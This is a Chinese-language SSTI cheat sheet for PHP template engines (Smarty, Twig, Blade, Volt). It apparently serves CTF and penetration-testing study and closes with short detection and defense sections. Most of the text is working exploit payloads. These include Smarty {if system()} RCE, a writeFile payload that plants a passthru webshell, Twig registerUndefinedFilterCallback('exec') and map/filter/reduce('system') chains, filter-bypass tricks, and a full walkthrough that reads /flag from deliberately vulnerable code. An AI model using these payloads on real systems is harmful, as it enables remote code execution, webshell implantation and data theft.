# PHP 模板注入

## 一句话理解
PHP 场景下的模板注入，通常出现在 Smarty、Twig 等模板引擎把用户输入直接当成模板代码渲染时，攻击者可借此读取变量、访问对象、调用函数，甚至进一步命令执行。

## 常见模板引擎
- Smarty
- Twig
- Blade（更多偏 Laravel 生态）

## 常见成因
- 把用户输入直接拼进模板源码
- 使用字符串渲染接口处理不可信内容
- 后台自定义模板、邮件模板、主题模板缺少权限边界
- 开发误以为“HTML 转义”就能防住模板注入

## 常见危害
- 读取模板变量和配置
- 访问敏感对象、请求对象、环境变量
- 文件读取
- 调用危险函数
- 在部分引擎和配置下实现代码执行

## Smarty 模板
### 1. 基础判断
可先用简单表达式测试是否进入模板求值：

```text
{$smarty.version}
{7*7}
```

若页面返回具体结果而不是原样文本，说明存在模板解释行为。

### 2. Payload
版本探针：

```text
// 回显 Smarty 版本号，同时确认引擎与定位版本
{$smarty.version}
```

Smarty 3.x RCE（CVE-2021-26120，影响 < 3.1.42 / < 4.0.2）：`{if}` 标签内的表达式会被当作 PHP 代码求值：

```text
// {if} 表达式内直接执行 PHP 函数
{if system('id')}{/if}
{if phpinfo()}{/if}

// 低版本可直接执行标签内函数
{system('cat /flag')}
```

开启 security policy（安全策略）时的利用：静态类方法调用不在默认禁用名单，可写文件落地 webshell：

```text
// 向当前脚本路径写入 webshell，之后用 ?cmd= 执行命令
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

`{php}` 标签（Smarty 2.x 可用，3.x 默认移除，需手动开启 php_handling）：

```text
{php}system('id');{/php}
```

self 对象读文件（老版本可用，`getStreamVariable` 在新版本已移除）：

```text
// 直接读取任意文件内容
{self::getStreamVariable("flag.php")}
```

常见过滤绕过：

```text
// {if} 表达式按 PHP 求值，反引号可执行 shell 命令，绕过函数名过滤
{if `cat /flag`}{/if}

// payload 外置到 GET 参数，绕过注入点对内容的关键字过滤
{if system($smarty.get.c)}{/if}

// 读取常量收集环境信息
{$smarty.const.PHP_OS}
```

绕过思路补充：
- `{$smarty.version}` 等探针被过滤时，改用 `{7*7}`、`{if 7*7==49}ok{/if}` 等表达式确认求值即可。
- `{literal}` 配合 X-Forwarded-For：当请求头（如 XFF）被记录并最终进入 Smarty 模板渲染时，直接在请求头里注入模板标签；若站内对内容做了过滤，可用 `{literal}` 包裹使内部原样输出（引擎不解析，常用于 XSS 绕过），再通过闭合 `{/literal}` 拼接出可解析的标签。

### 3. 利用关注点
Smarty 重点关注：
- 内置变量
- 模板函数
- 修饰器
- `self`、`smarty` 等可达对象
- 是否开启安全模式

### 4. 风险场景
- 把用户输入直接放进 `{include ...}`、`{eval ...}` 等高危模板逻辑
- 模板目录、编译目录、缓存目录配置不当

参考：
- [PHP 的模板注入（Smarty 模板）](https://blog.csdn.net/qq_45521281/article/details/107556915)

## Twig 模板
### 1. 基础判断
常见探针：

```text
{{7*7}}
```

### 2. Payload
版本/引擎探针：

```text
// 求值探针：回显 49 说明输入被当作模板求值
{{7*7}}

// 引擎区分：Twig 编译为 PHP 表达式返回 49；Jinja2 会返回 7777777
{{7*'7'}}

// 对象探针：能访问 _self.env 说明是 Twig 1.x 且未开沙箱
{{_self.env.display("id")}}
```

Twig 1.x（无沙箱）经典链：

```text
// 注册 exec 为未定义过滤器回调，再触发 getFilter 执行命令
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
// 读 flag
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}

// map / filter / reduce 会把字符串函数名当回调执行
{{['id']|map('system')}}
{{['id']|filter('system')}}
{{[0]|reduce('system','id')}}

// 直接调用函数名字符串（仅部分老版本语法支持，不完全通用）
{{'phpinfo'()}}
```

Twig 3.x 场景：`_self.env` 访问链已失效，但 `map`/`filter`/`reduce` 对回调参数只做 `is_callable` 检查，字符串函数名仍然可以通过；只要未启用沙箱、这些过滤器未被裁剪，链依旧成立：

```text
{{['id']|filter('system')}}
{{[0]|reduce('system','cat /flag')}}
```

沙箱模式（SandboxExtension）下，白名单外的标签/过滤器/函数直接报错。逃逸思路一句话：找白名单内“接受 callable 参数”的过滤器或应用自定义的不安全过滤器组合成链，历史逃逸细节跟进官方安全公告：
- https://twig.symfony.com/doc/3.x/api.html#sandbox-extension
- https://github.com/twigphp/Twig/security/advisories

### 3. 利用关注点
Twig 重点看：
- 是否允许访问对象方法
- 是否开启沙箱
- 是否暴露危险过滤器、函数、扩展
- 应用层是否把用户输入作为模板源码传入

### 4. 常见场景
- CMS 页面片段
- 邮件模板预览
- 后台可编辑主题模板
- 调试和错误页面

## Blade 模板（Laravel）
`{{ }}` 编译为 `e()`（htmlentities）转义输出，注入 `{{7*7}}` 只会原样回显，本身不构成 SSTI，注意不要误判：

```text
// 编译为 <?php echo e($name); ?> —— 转义输出，无模板求值
{{ $name }}
```

注意 `{!! !!}` 原样输出：编译为 `<?php echo $name; ?>` 不做任何转义，变量含用户可控内容时是 XSS（而非 SSTI）：

```text
// 原样输出，可控输入直接进入 HTML
{!! $user_input !!}
```

真正危险的是二次注入：应用把用户输入拼进 Blade 源码再编译（如 `Blade::compileString($user_input)`、后台可编辑邮件/主题模板落盘后渲染），此时输入中的 Blade 语法会被编译执行，直接 RCE：

```text
// 用户输入被当作 Blade 源码编译时
@php system('id'); @endphp
{{ system('id') }}
```

## 其他 PHP 模板引擎
- Plates：模板即原生 PHP 文件，正常用法下用户输入只作为变量输出，不构成 SSTI；仅当用户输入被写进 .php 模板文件内容再渲染时，等同于直接写入 PHP 代码，一步 RCE。
- Volt（Phalcon）：语法与 Twig 相似（`{{ }}`、`|` 过滤器），`{{ "id" | escape }}` 这类写法只是调用 escaper 做输出转义；真正风险是用户输入进入 Volt 源码后，`{{ }}` 表达式会被编译为 PHP，可直接调用函数实现 RCE：

```text
{{ system('id') }}
```

- Dwoo、RainTPL：同样存在字符串渲染/自定义模板场景的注入面，遇到时按“定界符探测 → 对象、函数可达性”思路套用 Smarty/Twig 的打法即可。

## 案例：Twig CTF 题完整流程
漏洞代码（典型形态：把 GET 参数直接当模板源码渲染）：

```php
<?php
require_once 'vendor/autoload.php';

// 漏洞点：用户输入没有作为变量传入，而是直接作为模板源码渲染
$loader = new Twig_Loader_String();
$twig   = new Twig_Environment($loader);
echo $twig->render($_GET['name']);
```

### 1. 求值确认

```text
?name={{7*7}}   → 页面回显 49，说明输入被当作模板求值
```

### 2. 确认是 Twig

```text
// Twig 编译为 PHP 表达式，7*'7' 返回 49；若是 Jinja2 则返回 7777777
?name={{7*'7'}}   → 49，确认 Twig

// 对象可达性：能访问 _self.env，确认 Twig 1.x 且未开沙箱
?name={{_self.env.display("id")}}
```

### 3. RCE

```text
// 注册 exec 为未定义过滤器回调，再触发 getFilter 执行命令
?name={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
→ uid=33(www-data) ...
```

### 4. 读 flag

```text
?name={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("ls /")}}
?name={{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
→ flag{...}
```

一句话总结：求值确认 → 引擎识别 → 对象/回调链 RCE → 命令取 flag。

## 实战排查思路
### 1. 先识别引擎
可结合：
- 报错栈
- 定界符
- 框架栈
- 响应中暴露的模板特征

### 2. 先测试表达式求值
如果只是原样回显，更可能是普通输出，不一定是模板注入。

### 3. 再测试对象可达性
重点确认：
- 是否能访问模板上下文
- 是否能访问请求对象、配置对象、应用对象
- 是否能进一步调用函数或方法

### 4. 后台场景优先级更高
PHP 模板注入很多时候出现在“管理员自定义模板”，权限一旦被低权限用户触达，危害往往较高。

## 防御要点
### 1. 不要把用户输入当模板源码
用户输入只能作为变量，不应直接进入模板解释层。

### 2. 限制模板能力
关闭不必要的：
- 动态求值
- 危险过滤器
- 危险函数
- 对象方法访问

### 3. 启用沙箱
若业务必须支持可编辑模板，应启用模板沙箱并最小化可访问对象。

### 4. 做权限隔离
模板编辑能力只能赋予极少数可信角色，且要有审计记录。

## 速查清单
- 先识别是 Smarty 还是 Twig
- 先测表达式求值，再看对象和函数可达性
- 重点排查后台模板、邮件模板、主题模板和预览功能
- 检查是否存在动态渲染字符串接口
- 不把模板注入与普通 XSS、字符串拼接回显混淆

## Reference
- https://www.cnblogs.com/bmjoker/p/13508538.html
- [PHP 的模板注入（Smarty 模板）](https://blog.csdn.net/qq_45521281/article/details/107556915)
- payloadbox/ssti-payloads：https://github.com/payloadbox/ssti-payloads
- Smarty CVE-2021-26120（NVD 公告）：https://nvd.nist.gov/vuln/detail/CVE-2021-26120
- Smarty 官方安全公告：https://github.com/smarty-php/smarty/security/advisories
- Twig 官方文档（Sandbox）：https://twig.symfony.com/doc/3.x/api.html#sandbox-extension
- Twig 官方安全公告：https://github.com/twigphp/Twig/security/advisories
